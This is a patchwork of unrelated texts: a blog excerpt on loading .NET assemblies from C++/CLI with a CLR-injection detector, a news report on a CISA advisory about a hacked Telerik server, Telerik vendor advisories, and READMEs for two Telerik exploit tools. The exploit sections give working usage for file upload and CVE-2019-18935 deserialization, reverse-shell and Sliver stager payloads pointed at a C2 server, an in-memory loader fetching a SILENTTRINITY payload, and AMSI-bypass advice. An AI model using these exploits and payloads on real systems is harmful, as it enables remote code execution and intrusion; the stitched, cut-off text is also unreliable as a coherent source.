For whatever disgusting reason you must use the `^` symbol preceeding a variable name. And to get the strings and other input to pass correctly into managed API calls you must marshall them from their unmanaged form to their managed form.

Please note, this sample code was designed for an older version of SILENTTRINITY that used a different staging process.

```
#using <mscorlib.dll>
#include "stdafx.h"
#using <System.dll>

// Load a managed DLL from a byte array and call a static method in the DLL.
// dll - the byte array containing the DLL
// dllLength - the length of 'dll'
// className - the name of the class with a static method to call.
// methodName - the static method to call. Must expect no parameters.
void LaunchDll(
	unsigned char *dll, size_t dllLength,
	char const *className, char const *methodName)
{
	// convert passed in parameter to managed values
	cli::array<unsigned char>^ mdll = gcnew cli::array<unsigned char>(dllLength);

	System::Runtime::InteropServices::Marshal::Copy(
		(System::IntPtr)dll, mdll, 0, mdll->Length);
	System::String^ cn =
		System::Runtime::InteropServices::Marshal::PtrToStringAnsi(
		(System::IntPtr)(char*)className);
	System::String^ mn =
		System::Runtime::InteropServices::Marshal::PtrToStringAnsi(
		(System::IntPtr)(char*)methodName);

	/**
	/Downloads the Assembly from a hardcoded URI. Comment out the stuff above.

	System::Net::WebClient ^_client = gcnew System::Net::WebClient();

	System::String ^uri = "http://192.168.197.133:8000/SILENTTRINITY_DLL.dll";

	System::Console::WriteLine("Downloading payload from: " + uri);

	cli::array<unsigned char>^ mdll = _client->DownloadData(uri);
	**/

	// used the converted parameters to load the DLL, find, and call the method.
	System::String^ args =
		System::Runtime::InteropServices::Marshal::PtrToStringAnsi(
		(System::IntPtr)(char*)"http://192.168.197.134:80");

	array< System::Object^ >^ arr = gcnew array< System::Object^ >(1);
	arr[0] = args;

	System::Reflection::Assembly^ a = System::Reflection::Assembly::Load(mdll);
	a->GetType(cn)->GetMethod(mn)->Invoke(nullptr, arr);
}

```

But, anyway, it works.

# Detecting CLR Injection

If you have been reading my blog posts about Donut, you may be familiar with ModuleMonitor. It uses WMI Event Win32\_ModuleLoadTrace to monitor for module loading. For each module that is loaded, it captures information about the process that loaded the module.

IT has a “CLR Sentry” option that follows some simple logic: If a process loads the CLR, but the program is not a .NET Assembly, then a CLR has been injected into it. This technique can be used to detect C++/CLI stagers for .NET Assemblies. Unfortunately, this means that it will detect ALL programs written in C++/CLI as malicious because they are all represented as Mixed Assemblies.

ModuleMonitor uses the following implementation of this logic in C#. The full code can be found in the ModuleMonitor repo.

```
//CLR Sentry
//Author: TheWover
 while (true)
        {
            //Get the module load.
            Win32_ModuleLoadTrace trace = GetNextModuleLoad();

            //Split the file path into parts delimited by a '\'
            string[] parts = trace.FileName.Split('\\');

            //Check whether it is a .NET Runtime DLL
            if (parts[parts.Length - 1].Contains("msco"))
            {
                //Get a
                Process proc = Process.GetProcessById((int) trace.ProcessID);

                //Check if the file is a .NET Assembly
                if (!IsValidAssembly(proc.StartInfo.FileName))
                {
                    //If it is not, then the CLR has been injected.
                    Console.WriteLine();

                    Console.WriteLine("[!] CLR Injection has been detected!");

                    //Display information from the event
                    Console.WriteLine("[>] Process {0} has loaded the CLR but is not a .NET Assembly:", trace.ProcessID);
                }
            }
        }

```

When the detection is successful, you should get a detection that looks like the following.

![_config.yml](/images/Manager/detected.png "CLR Injection Detected")

It is important to note that this behaviour represents all CLR Injection techniques, of which there are several. This detection should work for donut, as well as other tools such as Cobalt Strike’s ‘execute-assembly’ command.

You could also watch for loads of `clr.dll`. Or use ETW to subscribe to Assembly Load events. I’ll leave those as exercises for you.

## AMSI in .NET v4.8

Starting in .NET v4.8, AMSI integration was added to the CLR for loading Assemblies from memory. Like with other Assembly loading techniques, usage of the Reflection API in C++/CLI is subject to AMSI monitoring.

However, using C++/CLI for loading Assemblies presents an interesting opportunity: you may use an AMSI bypass without requiring your bypass code to pass through AMSI. AMSI bypasses are normally faced with a chicken-and-the-egg problem. To bypass AMSI you must execute suspicous code. That suspicious code must pass safely pass through the AMSI buffer in order to execute and unhook AMSI. However, if you use unmanaged code to unhook AMSI, then the bypassing code executes without any inspection by AMSI itself. So if you want to bypass AMSI you should do it in native C++ BEFORE loading your payload.

It is worth noting that managed code in a Mixed Assembly is NOT subject to AMSI. Just like executing a normal Assembly from disk, it will be subject to any AV analysis that scans files on disk. But it will not be subject to AMSI because it is never part of an Assembly loaded from memory. So if you can execute all of your malicious .NET logic without loading any Assembly from memory, you would be well advised to do so to avoid additional monitoring.

If you would like to know more about AMSI bypasses developed in unmanaged code, Odzhan and I created some for a modular bypass system in Donut: (https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/)

## Credits

This whole project is based off of a hunch I had, confirmed by a response to this StackOverflow question: (https://stackoverflow.com/questions/8206736/c-sharp-equivalent-of-dllmain-in-c-winapi/9745422#9745422)

This project began as a PoC of that article, and has been cleaned up and expanded to make it more generally useful.

![CISA](https://www.bleepstatic.com/content/hl-images/2021/12/14/CISA.jpg)

Last year, a U.S. federal agency's Microsoft Internet Information Services (IIS) web server was hacked by exploiting a critical .NET deserialization vulnerability in the Progress Telerik UI for ASP.NET AJAX component.

According to a joint advisory issued today by CISA, the FBI, and MS-ISAC, the attackers had access to the server between November 2022 and early January 2023 based on indicators of compromise (IOCs) found on the unnamed federal civilian executive branch (FCEB) agency's network.

At least two threat actors (one of them the Vietnamese [XE Group](https://www.volexity.com/blog/2021/12/07/xe-group-exposed-8-years-of-hacking-card-skimming-for-profit/)) accessed the unpatched server by exploiting this bug ([CVE-2019-18935](https://nvd.nist.gov/vuln/detail/CVE-2019-18935)) to gain remote code execution.

After hacking into the unnamed federal civilian executive branch (FCEB) agency's server, they deployed malicious payloads in the C:\Windows\Temp\ folder to collect and exfiltrate information to attacker-controlled command and control servers.

The malware installed on the compromised IIS server could deploy additional payloads, evading detection by deleting its traces on the system, and opening reverse shells to maintain persistence.

It could also be used to drop an ASPX web shell that provides an interface for browsing the local system, downloading and uploading files, and executing remote commands.

However, as detailed in the advisory, "no webshells were observed to be dropped on the target system, likely due to the abused service account having restrictive write permissions."

More information on the malware installed on the hacked Microsoft IIS servers can be found in [this malware analysis report](https://www.cisa.gov/news-events/analysis-reports/ar23-074a) also published today by CISA.

The CVE-2019-18935 Telerik UI vulnerability was also included in [the NSA's top 25 security bugs](https://www.bleepingcomputer.com/news/security/nsa-top-25-vulnerabilities-actively-abused-by-chinese-hackers/) abused by Chinese hackers and [the FBI's list of top targeted vulnerabilities](https://www.bleepingcomputer.com/news/security/fbi-reveals-top-targeted-vulnerabilities-of-the-last-two-years/).

## Microsoft IIS server left exposed to attacks

CISA added the CVE-2019-18935 Progress Telerik UI security vulnerability to its Known Exploited Vulnerabilities (KEV) Catalog in November 2021.

According to the binding operational directive (BOD 22-01) issued in November 2021, which requires federal agencies to CISA's KEV list to apply recommended actions, it should have been patched until May 3, 2022.

However, based on the IOCs linked to this breach, the U.S. federal agency failed to secure its Microsoft IIS server until the due date was reached.

CISA, the FBI, and MS-ISAC advise applying multiple mitigation measures to protect against other attacks targeting this vulnerability, with some of the highlights including:

* Upgrade all instances of Telerik UI ASP.NET AJAX to the latest version after appropriate testing.
* Monitor and analyze activity logs generated from Microsoft IIS and remote PowerShell.
* Limit service accounts to the minimum permissions necessary to run services.
* Prioritize remediation of vulnerabilities on internet-facing systems.
* Implement a patch management solution to ensure compliance with the latest security patches.
* Ensure vulnerability scanners are configured to scan a comprehensive scope of devices and locations.
* Implement network segmentation to separate network segments based on role and functionality.

"In addition to applying mitigations, CISA, FBI, and MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory," the [three organizations also recommended](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-074a).

"CISA, FBI, and MS-ISAC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory."

# [Unrestricted File Upload in RadAsyncUpload](#unrestricted-file-upload-in-radasyncupload)

## [Problem](#problem)

Security vulnerabilities [CVE-2014-2217](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2014-2217) and [CVE-2017-11317](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11317): weak encryption has been used in old versions of Telerik.Web.UI to encrypt data used by RadAsyncUpload.

## [Description](#description)

An exploit can result in arbitrary file uploads and/or remote code execution.

## [Solutions](#solutions)

> Update from Jan 5, 2021

Due to the .NET JavaScriptSerializer Deserialization ([CVE-2019-18935](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18935)) vulnerability, we strongly recommend upgrading to R1 2020 (version 2020.1.114) or later since the patches provided for [CVE-2014-2217](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2014-2217) and [CVE-2017-11317](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11317) do not prevent it.

Only the upgrade to R1 2020 (2020.1.114) or later can prevent the known vulnerabilities at the time of writing.

You can find more details and instructions at [Allows JavaScriptSerializer Deserialization](https://www.telerik.com/support/kb/aspnet-ajax/details/allows-javascriptserializer-deserialization?_ga=2.47010279.1514756545.1609746144-426342040.1588420200) and [Blue Mockingbird Vulnerability Picks up Steam—Telerik Guidance](https://www.telerik.com/blogs/blue-mockingbird-vulnerability-telerik-guidance).

> ### [Introduction](#introduction)
>
> **Update from 8 Sep 2017**: You *should* follow one of these options even if you are not using RadAsyncUpload in your application.
>
> **Update from 23 Oct 2019**: Information on avoiding the issue through general web.config networking settings was removed because it is not sufficiently safe. General readability and information structure improvements were made as well.
>
> To ensure your application is not exposed to risk, there are several mitigation paths that ensure different levels of security. The recommended approach with the highest level of security is using the Latest version of the controls and following the >recommendations of the [RadAsyncUpload Security article](https://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security).

>
> **NOTE**: Due to technical feasibility, the following versions do *not* have patches for this issue and need to be upgraded and the steps for the new version to be followed:
>
> * Q1 2011 SP2 (2011.1.519)
> * Q2 2011 SP1 (2011.2.915)
> * Q3 2011 SP1 (2011.3.1305)
> * Q1 2012 SP1 (2012.1.411)
> * Q2 2012 SP2 (2012.2.912)
>
> #### [Required steps:](#required-steps)
>
> **Step 1:** Follow the [RadAsyncUpload Security article](https://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security) and set all encryption keys.
>
> **Step 2:** Depending on project requirements and active maintenance licenses, there are a few options to pursue:
>
> * **Option 1:** Upgrade to R2 2017 SP2 (2017.2.911) or later and follow the steps for the chosen version.
> * **Option 2:** Apply a patch and [disable the built-in RadAsyncUpload handler](https://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security#disableasyncuploadhandler).
>
> #### [Recommended steps for improved security:](#recommended-steps-for-improved-security)
>
> Important encryption improvements were implemented in R2 2017 SP2 (2017.2.711) that improve the security of the control and we strongly recommend using that version or a newer one.
>
> * **Tip 1:** Upgrade to R3 2019 SP1 or later because it contains [custom metadata whitelisting feature](https://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security#allowedcustommetadatatypes).
> * **Tip 2:** Follow the [RadAsyncUpload Security article](https://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security) and set all encryption keys.

>
> This is a Telerik.Web.UI.dll assembly, available for most versions between Q1 2011 and R2 2017 SP1. It provides the following abilities for older versions that are available built-in for versions R2 2017 SP2 or later:
>
> 1. The temporary files in the TemporaryFolder are now saved with **.tmp** extension;
> 2. The built-in RadAsyncUpload handler can be disabled.
>
> You can follow the instruction in [How to Obtain and Apply the Patch](#how-to-obtain-and-apply-the-patch) section to get and apply the patch for your version.
>
> #### [Recommendations for improved security:](#recommendations-for-improved-security-2)

>
> ---
>
> ### [How to Obtain and Apply the Patch](#how-to-obtain-and-apply-the-patch)
>
> Before proceeding with the patching procedure, please review the following notes:
>
> * **Note 1:** If you are targeting .NET 3.5, review the [FIPS Compatibility article](http://docs.telerik.com/devtools/aspnet-ajax/controls/fips-compatibility), because the encryption issue it describes also pertains to these patches.
> * **Note 2:** The patches are **not** available on the Telerik NuGet feed.
> * **Note 3:** If you downloaded the patch before **the 15th of August 2017**, download and apply it again, because the file was updated since its [original creation](https://www.telerik.com/support/kb/aspnet-ajax/details/cryptographic-weakness).
> * **Note 4:** Due to technical feasibility, the following versions do *not* have patches for this issue and need to be upgraded and the steps for the new version to be followed:
> * Q1 2011 SP2 (2011.1.519)
> * Q2 2011 SP1 (2011.2.915)
> * Q3 2011 SP1 (2011.3.1305)
> * Q1 2012 SP1 (2012.1.411)
> * Q2 2012 SP2 (2012.2.912)
>
> #### [Here are the steps for obtaining and applying the patch:](#here-are-the-steps-for-obtaining-and-applying-the-patch)
>
> 1. Go to your [telerik.com account](https://www.telerik.com/account).

> 2. From the Version dropdown, select your release:
>

>
> 3. Download the **SecurityPatch\_<your\_version>.zip** file (e.g. **SecurityPatch\_2017.2.621.zip**);
> 4. [Replace the Telerik.Web.UI assembly in your application](http://docs.telerik.com/devtools/aspnet-ajax/installation/upgrading-instructions/upgrading-a-trial-to-a-developer-license-or-to-a-newer-version#manual-upgrade) with the one of the same version that you >just downloaded.
> 5. Disable the handler as explained in the [RadAsyncUpload Security article](https://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security#disableasyncuploadhandler).
> 6. Follow the [RadAsyncUpload Security article](https://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security) and set all encryption keys.
> 7. Verify the patch is applied.
>
> Once the built-in handler of RadAsyncUpload is disabled, the control *cannot be used* unless a [Custom Handler](https://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/how-to/how-to-extend-the-radasyncupload-handler) with the desired level of security >is defined.
>
> The custom metadata configuration whitelisting functionality further improves security. It is available as of R3 2019 SP1.
>
> Source code for building a patched version and [protecting the Telerik.Web.UI assembly](http://docs.telerik.com/devtools/aspnet-ajax/deployment/protecting-the-telerik-asp.net-ajax-assembly) is available as well.

Combined exploit for Telerik UI for ASP.NET AJAX.

* File upload for CVE-2017-11317 and CVE-2017-11357 - will automatically upload the file
* .NET deserialisation for CVE-2019-18935

Now supports testing for the target's ability to pull in remote payloads from an attacker-hosted SMB service. Use Burp Collaborator and/or Responder to facilitate testing whether the necessary pre-requisites are in place.

For exploitation to work, you generally need a version with hard coded keys, or you need to know the key, for example if you can disclose the contents of web.config. The exploit also allows for straightforward decryption and encryption of the rauPostData used with Telerik.Web.UI.WebResource.axd?type=rau

## Requirements

* python >= 3.6 with pycryptodome (<https://www.pycryptodome.org/en/latest/src/installation.html>) - installed with `pip3 install pycryptodome` or `pip3 install pycryptodomex`

## Published on exploit-db (old version)

* <https://www.exploit-db.com/exploits/43874/>

## See also

My other Telerik UI exploit (for CVE-2017-9248) will probably also be of interest. It is available here:

* <https://github.com/bao7uo/dp_crypto>

## To do

* Missing HMAC functionality for later versions.
* Ability to specify custom key.
* Command line argument for execution of a mixed mode dll (in the meantime use the example .NET deserialisation payload provided below).
* Command line arguments for testing capability of and loading remotely (SMB) hosted mixed mode dlls
* Separate utility for testing mixed mode dll.
* Provide source code/compilation instructions for mixed mode dll.
* Brute force versions.

Note - the last four items are complete but not released.

## Vulnerabilities

The file upload (CVE-2017-11317) vulnerability was discovered by others, I believe credits due to @straight\_blast @pwntester @olekmirosh . Shortly after it was announced, I encountered the Telerik library during the course of my work, so I researched it and the vulnerability and wrote this exploit in July 2017. I also reported CVE-2017-11357 for the related insecure direct object reference.

<https://www.telerik.com/support/kb/aspnet-ajax/upload-%28async%29/details/insecure-direct-object-reference>

The .NET deserialisation (CVE-2019-18935) vulnerability was discovered by [@mwulftange](https://github.com/mwulftange).

<https://www.telerik.com/support/kb/aspnet-ajax/details/allows-javascriptserializer-deserialization>

## Usage

```
$ ./RAU_crypto.py -h

RAU_crypto by Paul Taylor / @bao7uo
CVE-2017-11317, CVE-2019-18935 - Telerik RadAsyncUpload hardcoded keys / arbitrary file upload / .NET deserialisation

Usage:

Decrypt a ciphertext:               -d ciphertext
Decrypt rauPostData:                -D rauPostData
Encrypt a plaintext:                -e plaintext

Generate file upload rauPostData:   -E c:\\destination\\folder Version
Generate all file upload POST data: -p c:\\destination\\folder Version ../local/filename
Upload file:                        -P c:\\destination\\folder Version c:\\local\\filename url [proxy]

Generate custom payload POST data : -c partA partB
Send custom payload:                -C partA partB url [proxy]

Check remote SMB payload capability -r lhost url [proxy]

Load remote SMB dll payload         -R lhost/share/mixed_mode_assembly.dll url [proxy]\n\n" +
Trigger local uploaded dll payload  -L c:/users/public/documents/mixed_mode_assembly.dll url [proxy]\n\n" +

Example URL:               http://target/Telerik.Web.UI.WebResource.axd?type=rau
Example Version:           2016.2.504
Example optional proxy:    127.0.0.1:8080

N.B. Advanced settings e.g. custom keys or PBKDB algorithm can be found by searching source code for: ADVANCED_SETTINGS

## Custom payload (.NET deserialisation)

For details on custom payloads for .NET deserialisation, there is a great article by [@mwulftange](https://github.com/mwulftange) who discovered this vulnerability on the Code White blog at the following link.

* <https://codewhitesec.blogspot.com/2019/02/telerik-revisited.html>

Update - There is an alternative exploit by Caleb Gross [@noperator](https://github.com/noperator/CVE-2019-18935), which incorporates features from this exploit, with a great blog article explaining everything. Thanks also to Caleb for contributing to RAU\_Crypto.

* <https://threatvector.cylance.com/en_us/home/implications-of-loading-net-assemblies.html>
* <https://thewover.github.io/Mixed-Assemblies/>

Example .NET deserialisation payload:

```
$ ./RAU_crypto.py -C '{"Path":"file:///c:/users/public/documents/mixedmode64.dll"}' 'System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a' http://target/Telerik.Web.UI.WebResource.axd?type=rau

```

For mixed Mode DLL, see my other github repo:

* <https://github.com/bao7uo/MixedUp>

Special thanks to [@irsdl](https://github.com/irsdl) who inspired the custom payload feature.

## Description

[Telerik UI for ASP.NET AJAX](https://www.telerik.com/products/aspnet-ajax.aspx) is a widely used suite of UI components for web applications. It insecurely deserializes JSON objects in a manner that results in arbitrary remote code execution on the software's underlying host. For more information, see:

* The DerpCon talk [.NET Roulette](https://www.youtube.com/watch?v=--6PiuvBGAU) ([slides](https://know.bishopfox.com/cs/c/?cta_guid=80aa4ac9-84b9-45a4-9cf3-9f215e3f714a&placement_guid=f9ff0e1a-d44c-42ce-8be3-480356af7dc7&portal_id=5632775&canon=https%3A%2F%2Fknow.bishopfox.com%2Fevents%2Fbarrett-darnell-to-present-at-derpcon&redirect_url=APefjpGudybbT_RflCPD6bnEJCJeiyJQwOw2sIK_LZsJpPzGa3E7Q0zgcY2tAhXlkopDbQCzU_G0nEWApdZDnvmHG0BXZdg3RVqaDZTM7kRj-B-MgSRZtZf3sBb_IpKbpAYruI5qNjK-squ1hOQ-Ubq5hoeoYk8B_kwsDSuP7dyoJA5jUMpOdLd6GMURDLATA5GJfm0sOzClndse_fbJg10zBRMQ-byd_ikGcy3ttuQMBRJXkKHPCDFTMp5tODRK66YwFDGfL16GHjOiKLim0ORMvYzyCjOr6RS0qMUDfRbywQIcMWrd7hKI7XiphcZOXf7JcsstSrHn&click=a3983a0a-2932-41a5-b67f-deb4eee8a399&hsutk=2fd63671b84547f0be515dffcd468a6e&signature=AAH58kGXBfVBLDcwiB-xjb6tdRfjxsQXSw&pageId=28318760929&contentType=blog-post&__hstc=24978341.2fd63671b84547f0be515dffcd468a6e.1592575907261.1592575907261.1592575907261.1&__hssc=24978341.1.1592575907263&__hsfp=1563242614)) which details extra fundamentals about exploiting insecure deserialization, applies that to this exploit, and walks through some tips and tricks for getting shells on ASP.NET web applications.
* The [full write-up](https://hubs.ly/H0mfk7r0) at Bishop Fox, including a complete walkthrough of this vulnerability and exploit details for this issue (along with patching instructions).

## Getting started

### Prerequisites

You'll need [Visual Studio](https://visualstudio.microsoft.com/downloads/) and [.NET Framework SDK](https://dotnet.microsoft.com/download/visual-studio-sdks#:~:text=NET%20Standard%20article.-,.NET%20Framework,-.NET%20Framework%20is) installed to compile mixed-mode .NET assembly DLL payloads using `build-dll.bat`.

### Install

```
git clone https://github.com/noperator/CVE-2019-18935.git && cd CVE-2019-18935
python3 -m venv env
source env/bin/activate
python3 -m pip install -U pip
python3 -m pip install -r requirements.txt
```

This exploit leverages encryption logic from [RAU\_crypto](https://github.com/bao7uo/RAU_crypto). The `RAUCipher` class within `RAU_crypto.py` depends on PyCryptodome, a drop-in [replacement](https://blog.sqreen.com/stop-using-pycrypto-use-pycryptodome/) for the [dead](https://github.com/dlitz/pycrypto/issues/238) PyCrypto module. PyCryptodome and PyCrypto create problems when installed in the same environment, so the best way to satisfy this dependency is to install the module within a virtual environment, as shown above.

### Configure

Point [line 17](https://github.com/noperator/CVE-2019-18935/blob/master/build-dll.bat#L17) of `build-dll.bat` to the path of your Visual Studio installation.

```
set VSPATH=C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build
```

### Usage

```
$ python3 CVE-2019-18935.py -h
usage: CVE-2019-18935.py [-h] [-t] [-d] [-r FILENAME_REMOTE] [-s SMB_SERVER]
                         [-v UI_VERSION] [-n NET_VERSION] [-p PAYLOAD]
                         [-f FOLDER] -u URL

Exploit for CVE-2019-18935, a .NET JSON deserialization vulnerability in
Telerik UI for ASP.NET AJAX.

optional arguments:
  -h, --help          show this help message and exit
  -t                  just upload a file
  -d                  just deserialize
  -r FILENAME_REMOTE  remote payload name, for optional use with -d
  -s SMB_SERVER       remote SMB server, for optional use with -d
  -v UI_VERSION       software version
  -n NET_VERSION      .NET version
  -p PAYLOAD          mixed mode assembly DLL
  -f FOLDER           destination folder on target
  -u URL              https://<HOST>/Telerik.Web.UI.WebResource.axd?type=rau

```

#### Compile mixed mode .NET assembly DLL payload

Some payloads (e.g., `reverse-shell.c` and `sliver-stager.c`) require you to set the `HOST` and `PORT` fields to point to your C2 server—be sure to do that!

In a Windows environment with Visual Studio installed, use `build-dll.bat` to generate 32- and 64-bit mixed mode assembly DLLs to be used as a payload during deserialization. You may optionally specify a target CPU architecture as a second CLI argument (e.g., `x86`).

```
build-dll.bat sleep.c
```

#### Upload payload to target, and load payload into application

Pass the DLL generated above to `CVE-2019-18935.py`, which will upload the DLL to a directory on the target server (provided that the web server has write permissions in that directory) and then load that DLL into the application via the insecure deserialization exploit.

```
$ python3 CVE-2019-18935.py -v <VERSION> -p payloads/sleep-2019121205271355-x86.dll -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau
[*] Local payload name:  sleep-2019121205271355-x86.dll
[*] Destination folder:  C:\Windows\Temp

{'fileInfo': {'ContentLength': 75264,
              'ContentType': 'application/octet-stream',
              'DateJson': '1970-01-01T00:00:00.000Z',
              'FileName': '1576142987.918625.dll',
              'Index': 0},
 'metaData': {'AsyncUploadTypeName': 'Telerik.Web.UI.UploadedFileInfo, '
                                     'Telerik.Web.UI, Version=<VERSION>, '
                                     'Culture=neutral, '
                                     'PublicKeyToken=<TOKEN>',
              'TempFileName': '1576142987.918625.dll'}}

[*] Triggering deserialization...

<span><H1>Server Error in '/' Application.<hr width=100% size=1 color=silver></H1>
<h2> <i>Runtime Error</i> </h2></span>
...omitted for brevity...

[*] Response time: 13.01 seconds

```

In the example above, the application took at least 10 seconds to respond, indicating that the DLL payload successfully invoked `Sleep(10000)`.

#### Brute-force Telerik UI version

As detailed in the DerpCon talk [.NET Roulette (39:46)](https://youtu.be/--6PiuvBGAU?t=2386), we can brute-force the Telerik UI version by specifying only the *major* version of the `Telerik.Web.UI` assembly (i.e., the `2017` portion of the full version string `2017.2.503.40`) when uploading a file. This technique drastically reduces the search space when compared to brute-forcing each specific release of this software—and, as an added benefit, it can even detect versions that aren't explicitly listed in the [release history](https://www.telerik.com/support/whats-new/aspnet-ajax/release-history) for this software. Learn more about .NET assembly versioning on [MSDN](https://docs.microsoft.com/en-us/dotnet/api/system.version#remarks).

#### Implant with Sliver C2 framework

The custom [Sliver](https://github.com/BishopFox/sliver) stager payload [`sliver-stager.c`](/noperator/CVE-2019-18935/blob/master/sliver-stager.c) receives and executes Sliver shellcode (the stage) from the Sliver server (the staging server), following Metasploit's staging protocol. For more details on how this works, read the header in the payload source.

Start Sliver server. More info on server setup [here](https://github.com/BishopFox/sliver/wiki/Getting-Started).

```
MINGW_PATH='/usr/bin'  # Or wherever MinGW is located.
export SLIVER_CC_32="$MINGW_PATH/i686-w64-mingw32-gcc"
export SLIVER_CC_64="$MINGW_PATH/x86_64-w64-mingw32-gcc"
./sliver-server
```

Open C2 endpoint (we're using an mTLS listener here, but you can also use HTTP or DNS) on Sliver server, create an implant profile, and create a staging listener linked to that profile. More info on staged payloads [here](https://github.com/BishopFox/sliver/wiki/Stagers#example). Note that we're not generating a Sliver stager using `generate stager` as Sliver's documentation suggests; we're instead using our custom [`sliver-stager.c`](/noperator/CVE-2019-18935/blob/master/sliver-stager.c).

⚠️ Warning: Sending a stage of the wrong CPU architecture will *crash* the target process! For example, if the target is running a 32-bit version of Telerik UI and the staging server sends a 64-bit stage to the 32-bit stager, the web server process will crash. In the following example, we generate 32-bit shellcode—but you must match that to your target's CPU architecture using the `new-profile` command's `--arch` flag.

```
sliver > mtls
[*] Starting mTLS listener ...
[*] Successfully started job #1

sliver > new-profile --mtls <C2-ENDPOINT>:<PORT> --arch x86 --format shellcode --profile-name shellcode-32 --skip-symbols
[*] Saved new profile shellcode-32

sliver > stage-listener --url tcp://<STAGING-SERVER>:<PORT> --profile shellcode-32
[*] No builds found for profile shellcode-32, generating a new one
[*] Job 2 (tcp) started

```

Set the host and port in the Sliver stager source to point to the Sliver server (showing an example server below).

```
sed -Ei .bu 's/<HOST>/sliverserver.bishopfox.com/; s/<PORT>/443/' sliver-stager.c

```

Compile the Sliver stager payload, and upload the payload to the target and load it into the application (all according to the preceding Usage sections in this README).

```
> .\build-dll.bat sliver-stager.c x86

$ python3 CVE-2019-18935.py -v 2017 -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau -p payloads/sliver-stager-2020080514261722-x86.dll

```

If all goes well (have you [troubleshat](#Troubleshooting) this target?), you'll see a session created in your Sliver server window that you can use to interact with the target.

```
[*] Session #1 AFRAID_COMPUTER - <REMOTE-ADDRESS> (DESKTOP-D19S4Q2) - windows/386 - Wed, 05 Aug 2020 15:58:27 UTC

sliver > use 1

[*] Active session AFRAID_COMPUTER (1)

sliver (AFRAID_COMPUTER) > help

Commands:
=========
  clear  clear the screen
  exit   exit the shell
  help   use 'help [command]' for command help
  ...
  whoami             Get session user execution context

sliver (AFRAID_COMPUTER) > whoami

DESKTOP-D19S4Q2\tester

```

### Troubleshooting

* Each payload only works once—the .NET `AssemblyInstaller` class cannot load multiple .NET assemblies having the same assembly name (different from a *filename*). You'll need to compile and upload a new one each time you want the target to sleep, call back, etc.
* Ensure you're targeting the right CPU architecture (32- or 64-bit). This may take some guesswork; the sleep payload is useful here.
* Beware egress filtering rules on the target network when trying to initiate a reverse TCP connection back to your C2 server. Choose a commonly allowed TCP port, like 443.

* Add payload to upload and execute [Sliver](https://github.com/BishopFox/sliver) implant
* Adjust C payload to optionally run a single command, rather than opening an interactive shell
* Modify the assembly name of already compiled DLL to avoid recompiling for the same target
* Demonstrate brute-forcing major Telerik UI versions (i.e., the *year* portion of the version string)

# [Insecure Direct Object Reference in RadAsyncUpload](#insecure-direct-object-reference-in-radasyncupload)

## [Problem](#problem)

Security vulnerability [CVE-2017-11357](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11357): user input is used directly by RadAsyncUpload without modification or validation.

## [Description](#description)

An exploit can result in arbitrary file uploads in a limited location and/or remote code execution.

## [Solutions](#solutions)

> Update from Jan 5, 2021

Due to the .NET JavaScriptSerializer Deserialization ([CVE-2019-18935](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18935)) vulnerability, we strongly recommend upgrading to R1 2020 (version 2020.1.114) or later since the patches provided for [CVE-2017-1135](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11357), [CVE-2014-2217](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2014-2217) and [CVE-2017-11317](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11317) do not prevent it.

Only the upgrade to R1 2020 (2020.1.114) or later can prevent the known vulnerabilities at the time of writing.

You can find more details and instructions at [Allows JavaScriptSerializer Deserialization](https://www.telerik.com/support/kb/aspnet-ajax/details/allows-javascriptserializer-deserialization?_ga=2.47010279.1514756545.1609746144-426342040.1588420200) and [Blue Mockingbird Vulnerability Picks up Steam—Telerik Guidance](https://www.telerik.com/blogs/blue-mockingbird-vulnerability-telerik-guidance).

Also check the FAQ section at the end of the [Security article](https://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security?&_ga=2.240996419.1514756545.1609746144-426342040.1588420200#frequently-asked-questions).

## [Deprecated solutions](#deprecated-solutions)

> **Start of the deprecated solutions section:**
>
> To ensure your application is not exposed to risk, there are several mitigation paths. The recommended approach is to upgrade to the latest version and follow the steps in the [RadAsyncUpload Security article](https://docs.%3Etelerik.com/devtools/aspnet-ajax/controls/asyncupload/security). You can find other alternatives below.
>
> **Update from 8 Sep 2017:** You should follow one of these options even if you are not using RadAsyncUpload in your application.
>
> **Update from 23 Oct 2019:** Information on avoiding the issue through general web.config networking settings was removed because it is not sufficiently safe.
>
> * Use a patch for versions between Q1 2011 (2011.1.315) and R2 2017 SP1 (2017.2.621).
> * If you are on active maintenance, upgrade to R2 2017 SP2 (2017.2.711) or later.
>
> **NOTE:** The patches are **not** available on the Telerik NuGet feed.
>
> **NOTE:** If you are targeting .NET 3.5, review the [FIPS Compatibility article](http://docs.telerik.com/devtools/aspnet-ajax/controls/fips-compatibility), because the encryption issue it describes also pertains to these >patches.
>
> ---
>
> #### [Use a patch for versions between Q1 2011 (2011.1.315) and R2 2017 SP1 (2017.2.621)](#use-a-patch-for-versions-between-q1-2011-2011-1-315-and-r2-2017-sp1-2017-2-621)
>
